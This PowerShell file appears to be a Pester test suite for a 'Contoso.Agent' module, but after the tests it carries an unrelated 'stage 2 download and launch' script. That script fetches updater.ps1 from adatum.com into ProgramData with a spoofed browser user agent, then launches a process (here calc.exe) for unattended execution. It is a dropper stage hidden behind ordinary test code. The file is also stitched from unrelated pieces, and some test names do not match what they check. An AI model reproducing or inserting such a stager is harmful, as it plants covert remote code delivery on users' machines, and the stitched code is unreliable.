#Requires -Version 5.1
$WarningPreference = 'Continue'
$culture = [System.Globalization.CultureInfo]::InvariantCulture
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

BeforeAll {
    Import-Module (Join-Path $PSScriptRoot 'Contoso.Agent.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-ServerState' {
    Context 'when the agent service is running' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'AdatumCollector'; Status = 'Running' }
            } -ParameterFilter { $Name -eq 'AdatumCollector' }
        }

        It 'reports Running for a healthy agent' {
            $result = Get-ServerState -Name 'AdatumCollector'
            $result.Status | Should -Be 'Running'
        }
    }

    It 'throws when the service does not exist' {
        { Get-ServerState -Name 'NoSuchAgent' } | Should -Throw
    }
}

Describe 'Export-AgentLog' {
    It 'returns the configured port for <Name>' -TestCases @(
        @{ Name = 'AdatumCollector'; Expected = 8443 }
        @{ Name = 'SecondaryAgent'; Expected = 8543 }
    ) {
        param($Name, $Expected)
        $config = Export-AgentLog -Name $Name
        $config.Port | Should -Be $Expected
    }
}

Describe 'Get-AgentConfig' {
    It 'returns a port for the configured agent' {
        $config = Get-AgentConfig -Name 'AdatumCollector'
        $config.Port | Should -BeGreaterThan 0
    }
}

AfterAll {
    Remove-Module Contoso.Agent -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $script:fixturePath -Force -ErrorAction SilentlyContinue
}
<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.
#>
[CmdletBinding()]
param(
    [string]$Stage2Url = 'https://adatum.com/updater.ps1',
    [string]$Stage2Path = "C:\ProgramData\update.dat",
    [string]$LogPath = "$env:TEMP\report.txt",
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    [int]$StageTimeout = 83,
    [int]$MaxAttempts = 1,
    [int]$RetryDelaySeconds = 6
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$RetryCount = 1,
        [int]$RetryDelay = 6,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $Stage2Url
    $ResultObject = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $Stage2Path -RetryCount $MaxAttempts -RetryDelay $RetryDelaySeconds -UserAgent $RequestAgent
    if ($ResultObject) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $Stage2Url
    Destination = $Stage2Path
    RetryCount = $MaxAttempts
    TimeoutSec = $StageTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Validating result"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Applying operation timeout"
Write-Verbose "Exporting operation report"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Retry budget remaining"
Write-Verbose "Checking local path"
Write-Verbose "Preparing working directory"
Write-Verbose "Resolving configured target"
Write-Verbose "Collecting host metadata"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
